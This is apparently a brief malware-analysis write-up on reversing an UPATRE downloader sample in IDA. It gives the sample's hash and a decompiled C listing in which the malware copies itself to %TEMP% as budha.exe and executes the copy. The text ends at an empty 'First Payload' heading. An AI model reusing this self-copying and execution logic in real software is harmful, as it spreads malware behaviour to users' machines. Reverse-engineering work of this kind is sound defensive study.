## Reversing an UPATRE Downloader Sample With IDA

Simply put, UPATRE is a downloader written in C/C++ that retrieves payloads via HTTP. Downloaded payloads are typically written to disk and then executed.

Sample SHA 256: 0000b060341630c2385b5cea8ce2e866671519b31641f5a0c525b880fc655d9e

## Downloader - Replication
```C
 GetModuleHandleW(0);
  hHeap = HeapCreate(0, 0x2000u, 0);
  v0 = (WCHAR *)HeapAlloc(hHeap, 8u, 0x2000u);
  lpBuffer = (LPWSTR)HeapAlloc(hHeap, 8u, 0x2000u); // Memory Allocation ^
  GetModuleFileNameW(0, v0, 0x2000u); // Gets full path of current running process, stored in v0
  GetTempPathW(0x1000u, lpBuffer); // Gets path to %TEMP%, stored in lpBuffer
  wsprintfW(lpBuffer, L"%s%s", lpBuffer, L"budha.exe");
  FileW = CreateFileW(v0, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  hFile = FileW;
  if ( FileW == (HANDLE)-1 )
    return 1;
  nNumberOfBytesToRead = GetFileSize(FileW, 0);
  v3 = lstrlenW(v0);
  v4 = HeapAlloc(hHeap, 8u, nNumberOfBytesToRead + 2 * v3 + 4);
  v31 = v4;
  if ( !v4 )
    ExitProcess(1u);
  ReadFile(hFile, v4, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
  if ( lstrcmpW(v0, lpBuffer) )
  {
    v5 = lstrlenW(v0);
    sub_401000((char *)v31 + nNumberOfBytesToRead, v0, 2 * v5 + 2);
    hHeap = CreateFileW(lpBuffer, 0x40000000u, 2u, 0, 2u, 0x80u, 0);
    if ( hHeap == (HANDLE)-1 )
      return 1;
    v6 = lstrlenW(v0);
    WriteFile(hHeap, v31, nNumberOfBytesToRead + 2 * v6 + 4, &NumberOfBytesRead, 0);
    CloseHandle(hFile);
    CloseHandle(hHeap);
    GetTempPathW(0x1000u, v0);
    ShellExecuteW(0, L"open", lpBuffer, 0, v0, 0);
LABEL_8:
    ExitProcess(0);
  }
```





## First Payload 
